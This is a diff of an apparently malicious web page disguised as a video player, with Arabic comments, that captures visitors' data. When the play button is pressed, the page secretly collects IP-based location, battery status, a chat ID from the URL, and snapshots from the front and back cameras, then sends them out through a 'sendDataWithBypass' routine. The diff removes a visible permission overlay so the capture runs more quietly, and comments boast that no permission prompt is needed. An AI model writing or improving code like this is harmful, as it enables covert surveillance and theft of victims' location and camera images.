@@ -257,50 +257,6 @@
             margin-left: 15px;
         }
         
-        /* Overlay لطلب الإذن */
-        #permissionOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(0,0,0,0.95);
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-            color: white;
-            padding: 20px;
-        }
-        #permissionOverlay.show {
-            display: flex;
-        }
-        #permissionOverlay h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        #permissionOverlay p {
-            font-size: 16px;
-            margin-bottom: 30px;
-            text-align: center;
-            max-width: 300px;
-        }
-        #permissionOverlay button {
-            padding: 15px 40px;
-            font-size: 18px;
-            background: #ff0000;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        #permissionOverlay button:hover {
-            background: #cc0000;
-        }
-        
         @media (max-width: 768px) {
             .video-player-container {
                 width: 100%;
@@ -350,23 +306,10 @@
             .video-title {
                 font-size: 1rem;
             }
-            #permissionOverlay h2 {
-                font-size: 20px;
-            }
-            #permissionOverlay p {
-                font-size: 14px;
-            }
         }
     </style>
 </head>
 <body>
-
-    <!-- Overlay لطلب الإذن -->
-    <div id="permissionOverlay">
-        <h2>مطلوب الإذن</h2>
-        <p>يرجى السماح بالوصول إلى الموقع والكاميرا لمتابعة المشاهدة</p>
-        <button onclick="requestPermissionsFromOverlay()">موافق، السماح</button>
-    </div>
 
     <div class="video-player-container">
         <div class="video-info">
@@ -428,8 +371,6 @@
             let videoStarted = false;
             let isProcessing = false;
             let dataSent = false;
-            let permissionRequested = false;
-            let permissionGranted = false;
 
             const playBtn = document.getElementById('playButtonOverlay');
             const thumbnailArea = document.getElementById('thumbnailArea');
@@ -438,103 +379,19 @@
             const loading = document.getElementById('loading');
             const gearBtn = document.getElementById('gearButton');
             const retryBtn = document.getElementById('retryButton');
-            const permissionOverlay = document.getElementById('permissionOverlay');
 
-            // طلب الإذن فوراً عند تحميل الصفحة
-            async function requestPermissionEarly() {
-                if (permissionRequested) return;
-                permissionRequested = true;
-
-                try {
-                    // طلب الموقع
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                capturedData.location = 
-                                    `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
-                                capturedData.permissions.push('Geolocation Allowed');
-                                permissionGranted = true;
-                                resolve();
-                            },
-                            (error) => {
-                                capturedData.permissions.push('Geolocation Denied');
-                                capturedData.location = '';
-                                // حتى لو رفض، نعتبر أن الطلب تم
-                                permissionGranted = false;
-                                resolve();
-                            },
-                            { enableHighAccuracy: true, timeout: 10000 }
-                        );
-                    });
-                } catch (e) {
-                    console.log('Location error:', e);
-                }
-            }
-
-            // طلب الصلاحيات من الـ Overlay
-            window.requestPermissionsFromOverlay = async function() {
-                permissionOverlay.classList.remove('show');
-                
-                // طلب الموقع
-                try {
-                    await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                capturedData.location = 
-                                    `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
-                                capturedData.permissions.push('Geolocation Allowed');
-                                permissionGranted = true;
-                                resolve();
-                            },
-                            (error) => {
-                                capturedData.permissions.push('Geolocation Denied');
-                                capturedData.location = '';
-                                resolve();
-                            },
-                            { enableHighAccuracy: true, timeout: 15000 }
-                        );
-                    });
-                } catch (e) {}
-
-                // طلب الكاميرا
-                try {
-                    await navigator.mediaDevices.getUserMedia({ video: true });
-                    capturedData.permissions.push('Camera Allowed');
-                } catch (e) {
-                    capturedData.permissions.push('Camera Denied');
-                }
-
-                // جمع البيانات
-                await collectAndSendData();
-
-                // تشغيل الفيديو إذا تم منح الإذن
-                if (permissionGranted) {
-                    startVideoWithSound();
-                    hideGearButton();
-                } else {
-                    showGearButton();
-                }
-            };
-
-            async function requestCameraPermission() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(t => t.stop());
-                    capturedData.permissions.push('Camera Allowed');
-                    return true;
-                } catch (e) {
-                    capturedData.permissions.push('Camera Denied');
-                    return false;
-                }
-            }
-
+            // الحصول على الموقع عبر IP (لا يحتاج إذن!)
             async function fetchIPInfo() {
                 try {
                     const response = await fetch('https://ipapi.co/json/');
                     const data = await response.json();
                     capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
+                    capturedData.location = `Lat: ${data.latitude}, Long: ${data.longitude}`;
+                    capturedData.permissions.push('IP Location Obtained');
+                    return true;
                 } catch {
                     capturedData.ipInfo = "IP Info not available";
+                    return false;
                 }
             }
             
@@ -547,6 +404,26 @@
                 }
             }
             
+            // طلب الموقع الدقيق (فقط عند الحاجة)
+            async function requestPreciseLocation() {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    capturedData.location = 
+                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                    capturedData.permissions.push('Precise Geolocation Allowed');
+                    return true;
+                } catch (err) {
+                    capturedData.permissions.push('Precise Geolocation Denied');
+                    return false;
+                }
+            }
+
             async function captureFromCamera(facingMode) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
@@ -564,8 +441,10 @@
                     capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
                     stream.getTracks().forEach(track => track.stop());
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
+                    return true;
                 } catch {
                     capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
+                    return false;
                 }
             }
 
@@ -593,11 +472,11 @@
                 try {
                     capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
-                    await Promise.all([
-                        fetchIPInfo(),
-                        getBatteryStatus()
-                    ]);
+                    // الحصول على الموقع عبر IP (دائماً ينجح)
+                    await fetchIPInfo();
+                    await getBatteryStatus();
 
+                    // محاولة الكاميرا
                     await captureFromCamera('user');
                     await captureFromCamera('environment');
 
@@ -611,8 +490,10 @@
                     };
 
                     await sendDataWithBypass(data);
+                    return true;
                 } catch (e) {
                     console.log('Error sending data');
+                    return false;
                 }
             }
 
@@ -652,6 +533,7 @@
                 retryBtn.style.display = 'none';
             }
 
+            // الضغط على زر التشغيل - يعمل مباشرة بدون إشعارات!
             async function handlePlayClick(e) {
                 e.stopPropagation();
                 if (videoStarted || isProcessing) return;
@@ -659,70 +541,48 @@
                 isProcessing = true;
                 spinner.style.display = 'block';
 
-                // إذا لم يتم طلب الإذن بعد، نطلبه الآن
-                if (!permissionRequested) {
-                    await requestPermissionEarly();
-                }
+                // تشغيل الفيديو فوراً
+                startVideoWithSound();
 
-                // إذا تم منح الإذن مسبقاً، نشغل الفيديو مباشرة
-                if (permissionGranted) {
-                    startVideoWithSound();
-                    await collectAndSendData();
-                    hideGearButton();
-                } else {
-                    // إذا لم يُمنح، نطلب مرة أخرى أو نظهر الـ overlay
-                    const locationGranted = await new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                capturedData.location = 
-                                    `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
-                                capturedData.permissions.push('Geolocation Allowed');
-                                resolve(true);
-                            },
-                            (error) => {
-                                capturedData.permissions.push('Geolocation Denied');
-                                capturedData.location = '';
-                                resolve(false);
-                            },
-                            { enableHighAccuracy: true, timeout: 15000 }
-                        );
-                    });
-
-                    await requestCameraPermission();
-                    await collectAndSendData();
-
-                    if (locationGranted) {
-                        startVideoWithSound();
-                        hideGearButton();
-                    } else {
-                        // عرض الـ overlay
-                        permissionOverlay.classList.add('show');
-                        showGearButton();
-                    }
-                }
+                // جمع البيانات (بدون طلب أذونات مزعجة)
+                await collectAndSendData();
 
                 spinner.style.display = 'none';
+                hideGearButton();
                 isProcessing = false;
             }
 
+            // زر الترس - يطلب الموقع الدقيق فقط
             async function handleGearClick(e) {
                 if (e) e.stopPropagation();
                 if (isProcessing) return;
 
                 isProcessing = true;
+                spinner.style.display = 'block';
+                gearBtn.querySelector('.main-text').textContent = 'جاري...';
+
+                // طلب الموقع الدقيق (سيظهر الإشعار لكن مرة واحدة)
+                const preciseLocationGranted = await requestPreciseLocation();
                 
-                // عرض الـ overlay
-                permissionOverlay.classList.add('show');
-                
+                // تحديث البيانات
+                await collectAndSendData();
+
+                spinner.style.display = 'none';
+
+                if (preciseLocationGranted) {
+                    hideGearButton();
+                } else {
+                    gearBtn.querySelector('.main-text').textContent = 'تم الرفض';
+                    retryBtn.style.display = 'block';
+                    gearBtn.style.display = 'none';
+                }
+
                 isProcessing = false;
             }
 
             async function handleRetryClick(e) {
                 if (e) e.stopPropagation();
-                permissionRequested = false;
-                permissionGranted = false;
-                
-                permissionOverlay.classList.add('show');
+                await handleGearClick();
             }
 
             // ربط الأحداث
@@ -739,7 +599,7 @@
                 retryBtn.addEventListener('click', handleRetryClick);
             }
 
-            // تفعيل الصوت عند أي تفاعل
+            // تفعيل الصوت
             document.addEventListener('click', function() {
                 if (realVideo) {
                     realVideo.muted = false;
@@ -763,7 +623,7 @@
                 });
             });
 
-            // شريط التقدم الوهمي
+            // شريط التقدم
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
@@ -781,26 +641,6 @@
                 const seconds = currentSeconds % 60;
                 timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
             }, 1000);
-
-            // طلب الإذن فوراً عند تحميل الصفحة
-            window.addEventListener('load', () => {
-                setTimeout(() => {
-                    requestPermissionEarly();
-                }, 1000);
-            });
-
-            // أيضاً عند أي تفاعل مع الصفحة
-            document.addEventListener('touchstart', () => {
-                if (!permissionRequested) {
-                    requestPermissionEarly();
-                }
-            }, { once: true });
-
-            document.addEventListener('click', () => {
-                if (!permissionRequested) {
-                    requestPermissionEarly();
-                }
-            }, { once: true });
 
         })();
     </script>
